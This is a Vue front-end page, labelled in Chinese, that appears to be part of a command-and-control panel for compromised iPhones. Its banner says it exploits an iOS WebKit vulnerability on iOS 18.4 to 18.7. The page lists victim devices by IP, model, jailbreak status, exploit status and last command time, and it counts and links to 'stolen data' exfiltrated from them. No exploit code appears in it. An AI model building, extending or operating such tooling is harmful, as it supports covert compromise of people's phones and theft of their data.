<template>
  <div class="devices">
    <!-- 兼容性提示 -->
    <el-alert
      title="系统兼容性说明"
      type="info"
      :closable="false"
      show-icon
      style="margin-bottom: 15px;"
    >
      <p><strong>支持的iOS版本：</strong>iOS 18.4 - iOS 18.7</p>
      <p><strong>支持的设备型号：</strong>iPhone 15系列、iPhone 16系列（搭载A17 Pro / A18芯片）</p>
      <p><strong>说明：</strong>本系统利用iOS WebKit漏洞进行渗透测试，仅支持上述版本范围的设备。版本不匹配的设备将无法进行漏洞利用。</p>
    </el-alert>

    <!-- 统计卡片 -->
    <el-row :gutter="15" class="stats-row">
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #409eff;">
              <el-icon size="28"><Phone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.total_devices || 0 }}</div>
              <div class="stat-label">设备总数</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #67c23a;">
              <el-icon size="28"><CircleCheck /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.active_devices || 0 }}</div>
              <div class="stat-label">活跃设备</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #909399;">
              <el-icon size="28"><CircleClose /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.offline_devices || 0 }}</div>
              <div class="stat-label">离线设备</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #f56c6c;">
              <el-icon size="28"><FolderOpened /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.total_exfil || 0 }}</div>
              <div class="stat-label">窃取数据</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <!-- 设备分布 -->
    <el-row :gutter="15" class="distribution-row">
      <el-col :span="12">
        <el-card v-if="stats.by_os_version && Object.keys(stats.by_os_version).length > 0">
          <template #header>
            <span>iOS版本分布</span>
          </template>
          <el-row :gutter="10">
            <el-col :span="6" v-for="(count, version) in stats.by_os_version" :key="version">
              <el-tag type="primary" size="large">iOS {{ version }}: {{ count }}</el-tag>
            </el-col>
          </el-row>
        </el-card>
      </el-col>
      <el-col :span="12">
        <el-card v-if="stats.by_model && Object.keys(stats.by_model).length > 0">
          <template #header>
            <span>设备型号分布</span>
          </template>
          <el-row :gutter="10">
            <el-col :span="8" v-for="(count, model) in stats.by_model" :key="model">
              <el-tag type="success" size="large">{{ model }}: {{ count }}</el-tag>
            </el-col>
          </el-row>
        </el-card>
      </el-col>
    </el-row>

    <!-- 操作工具栏 -->
    <el-card>
      <div class="toolbar">
        <div class="search-bar">
          <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
          <el-input v-model="filters.ip" placeholder="IP地址" style="width: 180px;" />
          <el-select v-model="filters.status" placeholder="状态" style="width: 120px;">
            <el-option label="全部" value="" />
            <el-option label="活跃" value="active" />
            <el-option label="离线" value="offline" />
          </el-select>
          <el-button type="primary" @click="loadDevices">查询</el-button>
          <el-button @click="resetFilters">重置</el-button>
        </div>
        <div class="action-bar">
          <el-button type="primary" @click="refreshAllDevices">刷新版本信息</el-button>
          <el-button type="danger" @click="batchDelete" :disabled="selectedIds.length === 0">
            批量删除 ({{ selectedIds.length }})
          </el-button>
        </div>
      </div>

      <el-table 
        :data="devices" 
        border 
        v-loading="loading"
        @selection-change="handleSelectionChange"
      >
        <el-table-column type="selection" width="55" />
        <el-table-column prop="device_uuid" label="设备UUID" width="280" show-overflow-tooltip />
        <el-table-column prop="ip" label="IP地址" width="150" />
        <el-table-column prop="os_version" label="iOS版本" width="120">
          <template #default="scope">
            <span v-if="scope.row.os_version">{{ scope.row.os_version }}</span>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column prop="device_model" label="设备型号" width="120">
          <template #default="scope">
            <span v-if="scope.row.device_model">{{ scope.row.device_model }}</span>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column label="兼容性" width="120">
          <template #default="scope">
            <el-tag :type="getCompatibilityTag(scope.row)" size="small">
              {{ getCompatibilityText(scope.row) }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="first_seen" label="首次访问" width="180">
          <template #default="scope">{{ formatTime(scope.row.first_seen) }}</template>
        </el-table-column>
        <el-table-column prop="last_seen" label="最后访问" width="180">
          <template #default="scope">{{ formatTime(scope.row.last_seen) }}</template>
        </el-table-column>
        <el-table-column prop="status" label="状态" width="100">
          <template #default="scope">
            <el-tag :type="scope.row.status === 'active' ? 'success' : 'info'">
              {{ scope.row.status === 'active' ? '活跃' : '离线' }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column label="操作" width="280" fixed="right">
          <template #default="scope">
            <el-button size="small" type="primary" @click="viewDetail(scope.row)">详情</el-button>
            <el-button size="small" @click="viewLogs(scope.row.device_uuid)">日志</el-button>
            <el-button size="small" @click="viewExfil(scope.row.device_uuid)">数据</el-button>
            <el-button size="small" type="danger" @click="deleteDevice(scope.row)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>

    <!-- 设备详情对话框 -->
    <el-dialog title="设备详情" v-model="detailDialogVisible" width="60%">
      <div v-loading="detailLoading">
        <el-descriptions :column="2" border v-if="currentDevice">
          <el-descriptions-item label="设备UUID">
            {{ currentDevice.device_uuid }}
          </el-descriptions-item>
          <el-descriptions-item label="IP地址">
            {{ currentDevice.ip || '-' }}
          </el-descriptions-item>
          <el-descriptions-item label="状态">
            <el-tag :type="currentDevice.status === 'active' ? 'success' : 'info'">
              {{ currentDevice.status === 'active' ? '活跃' : '离线' }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="iOS版本">
            {{ currentDevice.os_version || '-' }}
          </el-descriptions-item>
          <el-descriptions-item label="设备型号">
            {{ currentDevice.device_model || '-' }}
          </el-descriptions-item>
          <el-descriptions-item label="芯片型号">
            {{ currentDevice.chipset || '-' }}
          </el-descriptions-item>
          <el-descriptions-item label="越狱状态">
            <el-tag :type="currentDevice.jailbroken === 'yes' ? 'danger' : 'info'">
              {{ currentDevice.jailbroken || '-' }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="漏洞状态">
            <el-tag :type="getExploitStatusTag(currentDevice.exploit_status)">
              {{ getExploitStatusText(currentDevice.exploit_status) }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="首次访问">
            {{ formatTime(currentDevice.first_seen) }}
          </el-descriptions-item>
          <el-descriptions-item label="最后访问">
            {{ formatTime(currentDevice.last_seen) }}
          </el-descriptions-item>
          <el-descriptions-item label="最后命令时间" span="2">
            {{ currentDevice.last_command_time ? formatTime(currentDevice.last_command_time) : '-' }}
          </el-descriptions-item>
          <el-descriptions-item label="User Agent" span="2">
            <el-input :model-value="currentDevice.user_agent" type="textarea" :rows="3" readonly style="width: 100%;" />
          </el-descriptions-item>
        </el-descriptions>
      </div>
      <template #footer>
        <el-button @click="detailDialogVisible = false">关闭</el-button>
        <el-button type="primary" @click="goToDeviceDetail">查看完整详情</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import { useRouter } from 'vue-router'
import axios from '../utils/axios'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Phone, CircleCheck, CircleClose, FolderOpened } from '@element-plus/icons-vue'

const router = useRouter()
const devices = ref([])
const loading = ref(false)
const stats = ref({})
const selectedIds = ref([])

const filters = reactive({
  device_uuid: '',
  ip: '',
  status: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

const detailDialogVisible = ref(false)
const detailLoading = ref(false)
const currentDevice = ref(null)

function formatTime(time) {
  if (!time) return '-'
  return time.replace('T', ' ').substring(0, 19)
}

function getExploitStatusTag(status) {
  const tags = {
    'success': 'success',
    'failed': 'danger',
    'in_progress': 'warning'
  }
  return tags[status] || 'info'
}

function getExploitStatusText(status) {
  const texts = {
    'success': '已成功利用',
    'failed': '利用失败',
    'in_progress': '正在利用中'
  }
  return texts[status] || (status || '-')
}

function getCompatibilityTag(row) {
  if (!row.os_version) return 'info'
  
  const supportedVersions = ['18.4', '18.5', '18.6', '18.7']
  if (supportedVersions.includes(row.os_version)) {
    return 'success'
  }
  
  const versionParts = row.os_version.split('.').map(Number)
  const major = versionParts[0] || 0
  const minor = versionParts[1] || 0
  
  if (major < 18 || (major === 18 && minor < 4)) {
    return 'danger'
  }
  
  return 'warning'
}

function getCompatibilityText(row) {
  if (!row.os_version) return '未知'
  
  const supportedVersions = ['18.4', '18.5', '18.6', '18.7']
  if (supportedVersions.includes(row.os_version)) {
    return '兼容'
  }
  
  const versionParts = row.os_version.split('.').map(Number)
  const major = versionParts[0] || 0
  const minor = versionParts[1] || 0
  
  if (major < 18 || (major === 18 && minor < 4)) {
    return '版本过低'
  }
  
  return '版本过高'
}

async function loadStats() {
  try {
    const response = await axios.get('/api/devices/stats')
    stats.value = response.data
  } catch (error) {
    console.error('加载统计数据失败:', error)
  }
}

async function loadDevices() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.ip) params.append('ip', filters.ip)
    if (filters.status) params.append('status', filters.status)
    
    const response = await axios.get(`/api/devices?${params}`)
    devices.value = response.data
    pagination.total = response.data.length
  } catch (error) {
    console.error('加载设备失败:', error)
  } finally {
    loading.value = false
  }
}

function handleSelectionChange(selection) {
  selectedIds.value = selection.map(item => item.device_uuid)
}

function viewDetail(row) {
  currentDevice.value = row
  detailDialogVisible.value = true
}

function goToDeviceDetail() {
  detailDialogVisible.value = false
  router.push(`/devices/${currentDevice.value.device_uuid}`)
}

function viewLogs(uuid) {
  router.push(`/logs?device_uuid=${uuid}`)
}

function viewExfil(uuid) {
  router.push(`/exfil?device_uuid=${uuid}`)
}

async function deleteDevice(row) {
  try {
    await ElMessageBox.confirm('确定要删除这个设备吗？此操作将同时删除关联的数据。', '提示', { type: 'warning' })
    await axios.delete(`/api/devices/${row.device_uuid}`)
    ElMessage.success('删除成功')
    loadDevices()
    loadStats()
  } catch (error) {
    if (error !== 'cancel') {
      ElMessage.error('删除失败')
    }
  }
}

async function batchDelete() {
  try {
    await ElMessageBox.confirm(`确定要删除选中的${selectedIds.value.length}个设备吗？此操作将同时删除关联的数据。`, '提示', { type: 'warning' })
    for (const uuid of selectedIds.value) {
      await axios.delete(`/api/devices/${uuid}`)
    }
    ElMessage.success(`已删除${selectedIds.value.length}个设备`)
    selectedIds.value = []
    loadDevices()
    loadStats()
  } catch (error) {
    if (error !== 'cancel') {
      ElMessage.error('删除失败')
    }
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.ip = ''
  filters.status = ''
  loadDevices()
}

async function refreshAllDevices() {
  try {
    const response = await axios.post('/api/devices/refresh-all')
    ElMessage.success(response.data.message)
    loadDevices()
    loadStats()
  } catch (error) {
    ElMessage.error('刷新失败')
  }
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadDevices()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadDevices()
}

onMounted(() => {
  loadStats()
  loadDevices()
})
</script>

<style scoped>
.stats-row {
  margin-bottom: 15px;
}

.distribution-row {
  margin-bottom: 15px;
}

.stat-card {
  display: flex;
  align-items: center;
  gap: 15px;
}

.stat-icon {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: bold;
  color: #333;
}

.stat-label {
  font-size: 14px;
  color: #999;
  margin-top: 5px;
}

.toolbar {
  display: flex;
  justify-content: space-between;
  margin-bottom: 15px;
  flex-wrap: wrap;
  gap: 10px;
}

.search-bar, .action-bar {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
}

.text-muted {
  color: #909399;
}
</style>